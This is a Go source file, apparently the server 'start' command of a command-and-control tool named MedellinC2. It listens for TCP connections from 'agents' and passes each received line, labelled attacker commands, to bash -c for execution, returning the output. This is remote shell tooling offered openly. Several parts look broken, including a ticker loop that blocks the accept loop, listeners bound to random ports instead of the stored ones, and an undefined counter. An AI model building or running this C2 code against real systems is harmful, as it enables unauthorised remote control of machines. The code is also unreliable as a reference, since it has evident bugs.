/*
Copyright © 2022 NAME HERE <EMAIL ADDRESS>

*/
package cmd

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/megatop1/MedellinC2/data"
	"github.com/spf13/cobra"
)

var logo = `
_____ ______   _______   ________  _______   ___       ___       ___  ________           ________   _______     
|\   _ \  _   \|\  ___ \ |\   ___ \|\  ___ \ |\  \     |\  \     |\  \|\   ___  \        |\   ____\ /  ___  \    
\ \  \\\__\ \  \ \   __/|\ \  \_|\ \ \   __/|\ \  \    \ \  \    \ \  \ \  \\ \  \       \ \  \___|/__/|_/  /|   
 \ \  \\|__| \  \ \  \_|/_\ \  \ \\ \ \  \_|/_\ \  \    \ \  \    \ \  \ \  \\ \  \       \ \  \   |__|//  / /   
  \ \  \    \ \  \ \  \_|\ \ \  \_\\ \ \  \_|\ \ \  \____\ \  \____\ \  \ \  \\ \  \       \ \  \____  /  /_/__  
   \ \__\    \ \__\ \_______\ \_______\ \_______\ \_______\ \_______\ \__\ \__\\ \__\       \ \_______\\________\
    \|__|     \|__|\|_______|\|_______|\|_______|\|_______|\|_______|\|__|\|__| \|__|        \|_______|\|_______|
	`

// startCmd represents the start command
var startCmd = &cobra.Command{
	Use:   "start",
	Short: "Starts the C2 server",
	Long:  `Starts the TCP server to begin listening and handling connections agents`,
	Run: func(cmd *cobra.Command, args []string) {
		//fmt.Println("start called")
		//listenForConnections()
		server()
	},
}

func init() {
	serverCmd.AddCommand(startCmd)
}

func handleConnection(c net.Conn) {
	fmt.Print("Agent successfully connected to MedellinC2 Server\n")
	for {
		netData, err := bufio.NewReader(c).ReadString('\n')
		if err != nil {
			fmt.Println(err)
			return
		}

		temp := strings.TrimSpace(string(netData))
		if temp == "STOP" {
			break
		}
		fmt.Println(temp)
		counter := strconv.Itoa(count) + "\n"
		c.Write([]byte(string(counter)))
	}
	c.Close()
}

func handlePorts(port string) {
	l, err := net.Listen("tcp4", ":"+port)

	if err != nil {
		fmt.Println(err)
		return
	}
	defer l.Close()

	for {
		connection, err := l.Accept()
		if err != nil {
			fmt.Println(err)
			return
		}
		go handleConnection(connection)
		//count++
		//handle commands
		for {
			attackerCommands, _ := bufio.NewReader(connection).ReadString('\n')
			cmd := exec.Command("bash", "-c", attackerCommands)
			if err != nil {
				log.Fatalln(err)
			}
			out, _ := cmd.CombinedOutput()

			connection.Write(out)
		}
	}

}

//TESTING
func handleClientRequest(con net.Conn) {
	defer con.Close()

	clientReader := bufio.NewReader(con)
	println("A new agent has successfully connected")
	for {
		// Waiting for the client request
		clientRequest, err := clientReader.ReadString('\n')

		switch err {
		case nil:
			clientRequest := strings.TrimSpace(clientRequest)
			if clientRequest == ":QUIT" {
				log.Println("agent willingly requested server to close the connection so closing")
				return
			} else {
				//log.Println(clientRequest)	//prints out user input after the new agent outputs "agent successfully connected" to server console
			}
		case io.EOF:
			log.Println("agent died. closed the connection by terminating the process")
			return
		default:
			log.Printf("error: %v\n", err)
			return
		}

		// Responding to the client request
		if _, err = con.Write([]byte("Command succesfully executed. Successfully Connected to MedellinC2! Please Continue interacting with your agent\n")); err != nil {
			log.Printf("failed to respond to client: %v\n", err)
		}

		//attacker commmands
		for {
			attackerCommands, _ := bufio.NewReader(con).ReadString('\n')
			cmd := exec.Command("bash", "-c", attackerCommands)
			if err != nil {
				log.Fatalln(err)
			}
			out, _ := cmd.CombinedOutput()

			con.Write(out)
		}
		//if connection closes after some commands were ran print to server console
	}
}

func server() {
	println(logo)

	listener, err := net.Listen("tcp", "0.0.0.0:8000") //start TCP server on 8000
	if err != nil {
		log.Fatalln(err)
	}
	defer listener.Close()

	//time.Sleep((2 * time.Second))
	for range time.Tick(time.Second * 10) {
		go checkListenerPorts()
	}

	println("Medellin C2 Server Successfully Started on 0.0.0.0:8000")
	//checkListenerPorts() //FIX THIS, ITS LOCATION AND THE FUNCTION'S CODE ITSELF AREN'T UP TO SNUFF
	for {
		//go checkListenerPorts()
		con, err := listener.Accept()
		if err != nil {
			log.Println(err)
			continue
		}
		//go checkListenerPorts()
		go handleClientRequest(con)
	}
}

// http://www.inanzzz.com/index.php/post/j3n1/creating-a-concurrent-tcp-client-and-server-example-with-golang

// Accept Loop
func acceptLoop(l net.Listener) {
	defer l.Close()
	for {
		c, err := l.Accept()
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println("New Connection found")
		handleClientRequest(c)
	}
}

//Purpose: Successfully checks for all open ports (stored in database)
func checkListenerPorts() {
	//Check all open ports in Listeners table in a loop and allow connections over those ports
	//format GetListenerPorts()
	s := data.GetListenerPorts() //string that contains every port
	v := strings.SplitN(s, ",", len(s))
	//fmt.Print(v)
	print("current listeners running on ports: ")
	for i := 0; i < len(v); i++ {
		//time.Sleep((2 * time.Second))
		print(v[i] + " ")

		listener, err := net.Listen("tcp", "0.0.0.0:0") //start TCP server on 8000
		if err != nil {
			log.Fatalln(err)
		}
		//defer listener.Close()
		go openPorts(listener) //allows for multiple connections over the same port
	}

}

//Purpose: Will continuously update open ports, when a user creates a new listener, then the port will be opened immediatly
func openPorts(listener net.Listener) {
	for {
		con, err := listener.Accept()
		if err != nil {
			log.Println(err)
		}
		//time.Sleep(time.Second)
		go handleClientRequest(con) //without this, a 2nd connection on the same port can connect but CANNOT run commands on the remote host, hence the go in the beginning
		defer listener.Close()
	}
}
